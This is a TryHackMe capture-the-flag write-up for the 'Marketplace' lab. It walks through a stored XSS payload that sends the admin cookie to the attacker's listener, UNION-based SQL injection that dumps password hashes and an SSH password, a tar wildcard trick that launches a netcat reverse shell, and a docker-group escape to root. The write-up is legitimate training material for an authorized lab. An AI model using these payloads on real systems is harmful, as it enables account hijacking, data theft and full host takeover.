---
title: "Marketplace TryHackMe Write Up"
last_modified_at: 2020-10-17T14:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - xss
  - sqli
  - docker
  - tar privilege escalation
---

MarketPlace is a medium rated room on tryhackme by [jammy](https://tryhackme.com/p/jammy). At first admin cookie was obtained using XSS and after that using SQL injection login password for user jake was obtained. Entry on the sudoers file is exploited to get a shell as user michael who was in the docker group which was used to get a root shell on the box.

Room Link : [https://tryhackme.com/room/marketplace](https://tryhackme.com/room/marketplace)

# Task 1
> The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.  
Can you take advantage of this and will you be able to gain root access on his server?


## Port Scan
```console
local@local:~/Documents/tryhackme/marketplace$ nmap -sC -sV -oN nmap/initial 10.10.63.77
Nmap scan report for 10.10.63.77
Host is up (0.40s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Port 80

![1](/assets/images/thm/marketplace/1.png)

### Signing up and loggin in

![2](/assets/images/thm/marketplace/2.png)
I sign up with username **a** and password **a** and logged in.

![3](/assets/images/thm/marketplace/3.png)

## /admin
As shown on the nmap result on robots.txt, there is an /admin entry.
```console
local@local:~/Documents/tryhackme/marketplace$ curl http://10.10.38.49/admin
<!DOCTYPE html>
<html>
  <head>
    <title>Error</title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
  </head>
  <body>
    <nav>
    <b>The Marketplace</b>
  <div class="right">
    <a href="/">Home</a> |
  
      <a href="/login">Log in</a> |
      <a href="/signup">Sign up</a>
    
  </div>
</nav>

    <h2>You are not authorized to view this page!</h2>
  </body>
</html>
```
It says we are not authorized to view this page.

## /new
On /new we can now create a new listing. As the room has the tag xss, I thought of using a xss payload.

![5](/assets/images/thm/marketplace/5.png)

![6](/assets/images/thm/marketplace/6.png)
And we have a XSS.

### Checking the cookie
```js
> document.cookie
"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYSIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjAzMDM4MzUwfQ.wDze0odW4n82KOUUa8ODDqykpuNXkwME0i-0x7HREB0"
```
I do have a cookie and it will be nice if we could steal a cookie from a adminstrator and maybe then we can access that /admin page. But we need a way for the admin to load the article that we create, on his/her browser so that we could run script on admin's browser.

On the page displaying our newly created article, I found something interesting.
![7](/assets/images/thm/marketplace/7.png)
It looks like we can report the listing to the admin and there is the possibility that the admin visits to our listing which will runs the javascript on his browser giving us his cookie.

## Getting Admin's cookie
### Payload used
```js
<script>document.location='http://10.2.3.202:8000/XSS/grabber.php?c='+document.cookie</script>
```
### Listening on port 8000 on our box
```console
local@local:~/Documents/tryhackme/marketplace$ nc -nvlkp 8000
Listening on [0.0.0.0] (family 2, port 8000)
Listening on 0.0.0.0 8000
```

### Creating a new listing

![8](/assets/images/thm/marketplace/8.png)

And if we check the netcat session, we get a hit but this time we get our own cookie.
```console
local@local:~/Documents/tryhackme/marketplace$ nc -nvlkp 8000
Listening on [0.0.0.0] (family 2, port 8000)
Listening on 0.0.0.0 8000
Connection received on 10.2.3.202 36088
GET /XSS/grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYSIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjAzMDM4MzUwfQ.wDze0odW4n82KOUUa8ODDqykpuNXkwME0i-0x7HREB0 HTTP/1.1
Host: 10.2.3.202:8000
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.38.49/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8

Connection received on 10.2.3.202 36090
```
Lets report this post to the admin.
![9](/assets/images/thm/marketplace/9.png)
And if we check our netcat listener, this time we got the admin's cookie.

```console
Connection received on 10.2.3.202 36090
Connection received on 10.10.38.49 51870
GET /XSS/grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMwMzk1MjJ9.0Mu4w5H8_TaTJQjtFOt4mHRYEkzxlK82npxm5xwj_IA HTTP/1.1
Host: 10.2.3.202:8000
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localhost:3000/item/4
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Now we can change the value of our cookie with admin's cookie.
### On browser console
```js
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMwMzk1MjJ9.0Mu4w5H8_TaTJQjtFOt4mHRYEkzxlK82npxm5xwj_IA"
```

### Visiting /admin
![10](/assets/images/thm/marketplace/10.png)
We are now admin, we got our first flag and we can see bunch of users information.

As I was clicking around and I noticed that there was a parameter user which was giving the information of different users when I change the value of it.
![11](/assets/images/thm/marketplace/11.png)

So I tested if it was vulnerable to SQL injection and turns out it was.
#### Payload
```html
/admin?user=1'
```
![12](/assets/images/thm/marketplace/12.png)

So at first, I sent the request to the SQLMap in hope of dumping the whole database but I couldnot as there was some firewall in place which invalidates the admin's session cookie. So I decided to do a manual enumeration.

## Manual SQL injection
### Sending Request to Burp Suite
#### Request
```html
GET /admin?user=1 HTTP/1.1
Host: 10.10.38.49
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMwMzk1MjJ9.0Mu4w5H8_TaTJQjtFOt4mHRYEkzxlK82npxm5xwj_IA
Connection: close
```
### Partial Response
```html
      <div>
          User system <br />
          ID: 1 <br />
          Is administrator: false <br />
       <button onclick="this.disabled = true">Delete user</button>
```

#### Determining the columns returned
#### Request Payload
```html
/admin?user=0 union select 1,2,3,4 -- -
```
#### Response
```html
      <div>
          User 2 <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
```
The query returns 4 columns in which value of column 1 and 2 are reflected on the output.

#### Enumerating the Databases
#### Request
```html
user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
```
#### Response
```html
information_schema,marketplace
```
We have two databases.
#### Enumerating the tables inside marketplace
#### Request
```html
user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -
```
#### Response
```html
      <div>
          User items,messages,users <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
```
There are three tables. ie users,messages and items.

#### Enumerating the columns inside the tables
### Table : users

#### Request for enumerating columns inside users table
```html
/admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'-- -
```
#### Response
```html
 <br />
          ID: id
,username
,password
,isAdministrator
 <br />
```
There are 4 colums: ie id,username,password and isAdministrator. So lets dump all the contents of the users table.

##### Content of users table
#### Request
```html
/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
```
#### Response
```html
  <div>
          User 1:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW:0
,2:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q:1
,3:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG:1
,4:a:$2b$10$O9iXKuQ.xG1ckYhmmYDtzeG2V6O1D8gIUHCrg.iDOK4j3Co.Qgy16:0
 <br />
```
We got few users along with the password hashes.

##### Table : messages
#### Request for enumerating columns inside message table
```html
/admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -
```
#### Response
```html
<br />
          ID: id
,user_from
,user_to
,message_content
,is_read
 <br />
```
##### Content of messages table
#### Request
```html
GET /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
```
#### Response
```html
          User Hello!
An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
Your new password is: @b_ENXkGYUCAv3zJ
,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
,Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee&#39;s browsers.
```
Here we got a potential SSH password `@b_ENXkGYUCAv3zJ`.

Now that we got a bunch of username and a potential SSH password lets try and SSH into the box.

Users
```
system
michael
jake
```
Password
```
@b_ENXkGYUCAv3zJ
```
As there were only 3 usernames, I tried them manually instead using hydra and got in the box as user Jake.

### Shell as Jake
```console
local@local:~/Documents/tryhackme/marketplace$ ssh jake@10.10.38.49
The authenticity of host '10.10.38.49 (10.10.38.49)' can't be established.
ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.38.49' (ECDSA) to the list of known hosts.
jake@10.10.38.49's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 18 17:26:02 UTC 2020

  System load:  0.0                Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.38.49
  Memory usage: 31%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    102

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


jake@the-marketplace:~$ 
```
### Reading 2nd flag
```console
jake@the-marketplace:~$ cat user.txt 
THM{c3648************************c0b4}
```

# Horizontal Privilege Escalation to michael
## Sudo -l
```console
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```
Jake can run the /opt/backups/backup.sh as user michael.

### Content of backup.sh
```console
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

And I found [this](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) amazing post explaining how to exploit the wildcard in tar for privilege escalation.

### Getting a reverse shell as michael
```console
jake@the-marketplace:~$ cd /opt/backups/
jake@the-marketplace:/opt/backups$ ls
backup.sh  backup.tar
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.202 9001 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
```

### Listening on our box
```console
local@local:~/Documents/tryhackme/marketplace$ nc -nvlp 9001
Listening on [0.0.0.0] (family 2, port 9001)
Listening on 0.0.0.0 9001
```

### Running the script as michael
```console
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
tar: /opt/backups/backup.tar: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
```
It says permission denied. So lets change the file permissions of the backup.tar and shell.sh to 777.
```console
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar shell.sh 
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh 
Backing up files...
tar: backup.tar: file is the archive; not dumped
rm: cannot remove '/tmp/f': No such file or directory
```
And this time after running the script, we get a connection back.
```console
local@local:~/Documents/tryhackme/marketplace$ nc -nvlp 9001
Listening on [0.0.0.0] (family 2, port 9001)
Listening on 0.0.0.0 9001
Connection received on 10.10.38.49 50788
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
$ 
```
And if we check the group, user micheal is on docker group which means we can create a new container mounting the root filsystem.

### Listing the dcoker images
```console
$ docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        6 weeks ago         2.16GB
nginx                        latest              4bb46517cac3        2 months ago        133MB
node                         lts-buster          9c4cc2688584        2 months ago        886MB
mysql                        latest              0d64f46acfd1        2 months ago        544MB
alpine                       latest              a24bb4013296        4 months ago        5.57MB
```
### Creating a new container mounting the root filesystem
```console
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
the input device is not a TTY
```
It says the input device is not a TTY. So lets get a TTY using python.

### Getting a TTY
```console
$ python -c "import pty;pty.spawn('/bin/bash')"
michael@the-marketplace:/opt/backups$
```

### Creating a new container
```console
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
Here we have created a new docker container from image alpine, mounted the root filesystem to /mnt, started the docker container in interactive mode which will give us a shell to work with, changed the root to /mnt and finally told to delete the container upon exiting.

### Reading root.txt
```console
# cat /root/root.txt
cat /root/root.txt
THM{d4f76************************d62}
```




